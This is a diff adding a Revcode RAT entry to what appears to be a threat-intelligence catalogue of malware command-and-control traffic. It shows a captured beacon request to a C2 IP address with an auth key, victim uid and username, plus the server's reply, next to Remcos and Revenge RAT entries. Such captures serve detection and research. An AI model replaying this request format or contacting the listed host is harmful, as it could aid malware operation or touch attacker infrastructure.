@@ -2516,6 +2516,33 @@ xa...x..N.qM...
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/remcos.png "Remcos")
 
+#### Revcode RAT
+~~~
+POST /recv4.php HTTP/1.1
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: WebMonitor Client
+Host: 151.106.0.80
+Content-Length: 187
+Cache-Control: no-cache
+
+keyauth=Mk45U3pxVHBZc1JNZ0F2SHxjMTNiOTYyMmMzMGNmNWMyY2M3NzEzNGQzOWEzNTkyZnw0M3w4fDIx&key=90AouQzhwLF1M0GQgCr8TyhSZI0k5pT9&uid=fd77d5053fc0439d53a9125c9f9da5af&user=faridsule08&cmp=0&enc=0
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Tue, 28 May 2019 20:40:53 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 3
+Connection: keep-alive
+Set-Cookie: PHPSESSID=t16fp416o0to9i1bv6kadqkoa0; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+
+1-1
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revcode.png "Revcode")
+
 #### Revenge RAT
 ~~~
 InformationRevenge-RATUEVSRElSRevenge-RATX0M0QkEzNjQ3Revenge-RAT192.168.100.213Revenge-RATVVNFUi1QQyAvIGFkbWluRevenge-RATNoRevenge-RATTWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwgIDMyRevenge-RATSW50ZWwoUikgQ29yZShUTSkgaTUtNjQwMCBDUFUgQCAyLjcwR0h6Revenge-RAT3757686784Revenge-RATTi9BRevenge-RATTi9BRevenge-RAT1000Revenge-RATTWljcm9zb2Z0IFBvd2VyUG9pbnQ=Revenge-RATZW4tVVM=Revenge-RATFalse*-]NK[-*
